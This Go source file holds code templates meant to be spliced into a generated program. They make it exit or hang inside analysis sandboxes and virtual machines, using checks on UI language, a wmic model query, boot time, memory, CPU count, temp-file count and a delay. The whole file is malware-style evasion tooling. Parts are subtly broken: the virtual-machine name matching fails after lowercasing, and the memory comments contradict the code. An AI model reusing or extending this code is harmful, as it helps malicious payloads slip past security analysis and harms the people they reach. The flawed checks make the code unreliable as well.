package sandbox

var (
	Weibucheck = []string{`check_language()
	fmt.Printf("1.\n")
	b, _ := check_xuniji()
	if b == true {
		for true {
			fmt.Printf("55555。\n")
		}
	}
	fmt.Printf("2.\n")
	check_shahe()
	fmt.Printf("3.\n")
	var a, z = 176, 219
	fmt.Printf("%c%c%c%c%c \n", z, a, a, a, z)
	fmt.Printf("%c%c%c%c%c \n", a, z, a, z, a)
	fmt.Printf("%c%c%c%c%c \n", a, a, z, a, a)
	fmt.Printf("%c%c%c%c%c \n", a, z, a, z, a)
	fmt.Printf("%c%c%c%c%c \n", z, a, a, a, z)

	//__SANDBOX__
`, `

    `}
)

var (
	Weibucheckfunc = []string{`func check_language() {
	a, _ := windows.GetUserPreferredUILanguages(windows.MUI_LANGUAGE_NAME)
	if a[0] != "zh-CN" {
		for true {
			fmt.Printf("111111111。\n")
		}
	}
}

func check_shahe() {
	// 1. 延时运行
	timeSleep1, _ := timeSleep()
	// 2. 检测开机时间
	bootTime1, _ := bootTime()
	// 3. 检测物理内存
	physicalMemory1, _ := physicalMemory()
	// 4. 检测CPU核心数
	numberOfCPU1, _ := numberOfCPU()
	// 5. 检测临时文件数
	numberOfTempFiles1, _ := numberOfTempFiles()
	level := timeSleep1 + bootTime1 + physicalMemory1 + numberOfCPU1 + numberOfTempFiles1 // 有五个等级，等级越趋向于5，越像真机
	fmt.Println("level:", level)
	if level < 4 {
		os.Exit(1)

	}
}

// 1. 延时运行
func timeSleep() (int, error) {
	startTime := time.Now()
	time.Sleep(30 * time.Second)
	endTime := time.Now()
	sleepTime := endTime.Sub(startTime)
	if sleepTime >= time.Duration(5*time.Second) {
		//fmt.Println("睡眠时间为:", sleepTime)
		return 1, nil
	} else {
		return 0, nil
	}
}

// 2. 检测开机时间
// 许多沙箱检测完毕后会重置系统，我们可以检测开机时间来判断是否为真实的运行状况。
func bootTime() (int, error) {
	var kernel = syscall.NewLazyDLL("Kernel32.dll")
	GetTickCount := kernel.NewProc("GetTickCount")
	r, _, _ := GetTickCount.Call()
	if r == 0 {
		return 0, nil
	}
	ms := time.Duration(r * 1000 * 1000)
	tm := time.Duration(30 * time.Minute)
	//fmt.Println(ms,tm)
	if ms < tm {
		return 0, nil
	} else {
		return 1, nil
	}

}

// 3、物理内存大小
func physicalMemory() (int, error) {
	var mod = syscall.NewLazyDLL("kernel32.dll")
	var proc = mod.NewProc("GetPhysicallyInstalledSystemMemory")
	var mem uint64
	proc.Call(uintptr(unsafe.Pointer(&mem)))
	mem = mem / 1048576
	fmt.Printf("物理内存为%dG\n", mem)
	if mem < 8 {
		return 0, nil // 小于4GB返回0
	}
	return 1, nil // 大于4GB返回1
}

func numberOfCPU() (int, error) {
	a := runtime.NumCPU()
	//fmt.Println("CPU核心数为:", a)
	if a < 4 {
		return 0, nil // 小于4核心数,返回0
	} else {
		return 1, nil // 大于4核心数，返回1
	}
}
func numberOfTempFiles() (int, error) {
	conn := os.Getenv("temp") // 通过环境变量读取temp文件夹路径
	var k int
	if conn == "" {
		//fmt.Println("未找到temp文件夹，或temp文件夹不存在")
		return 0, nil
	} else {
		local_dir := conn
		err := filepath.Walk(local_dir, func(filename string, fi os.FileInfo, err error) error {
			if fi.IsDir() {
				return nil
			}
			k++
			// fmt.Println("filename:", filename)  // 输出文件名字
			return nil
		})
		//fmt.Println("Temp总共文件数量:", k)
		if err != nil {
			// fmt.Println("路径获取错误")
			return 0, nil
		}
	}
	if k < 30 {
		return 0, nil
	}
	return 1, nil
}

func check_xuniji() (bool, error) { // 识别虚拟机
	model := ""
	var cmd *exec.Cmd
	cmd = exec.Command("cmd", "/C", "wmic path Win32_ComputerSystem get Model")
	stdout, err := cmd.Output()
	if err != nil {
		return false, err
	}
	model = strings.ToLower(string(stdout))
	if strings.Contains(model, "VirtualBox") || strings.Contains(model, "virtual") || strings.Contains(model, "VMware") ||
		strings.Contains(model, "KVM") || strings.Contains(model, "Bochs") || strings.Contains(model, "HVM domU") || strings.Contains(model, "Parallels") {
		return true, nil //如果是虚拟机则返回true
	}
	return false, nil
}
   //__FUNC__
`, `"time"
    "os"
     "syscall"
    "runtime"
	"strings"
	"os/exec"
	"path/filepath"
     "fmt"
`}
)
